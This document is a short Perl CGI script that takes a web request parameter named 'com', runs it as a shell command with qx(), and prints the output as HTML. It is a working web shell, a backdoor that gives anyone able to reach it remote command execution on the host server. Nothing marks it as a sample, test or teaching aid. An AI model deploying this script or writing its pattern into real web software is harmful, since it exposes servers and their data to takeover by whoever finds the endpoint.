#! /usr/bin/perl

use CGI ':standard', '-debug';

print "content-type: text/html \n\n";
$command = param('com');
@ret = qx($command);
$size = @ret;
for($i = 0; $i < $size; $i++) {
	print $ret[$i], br;
}
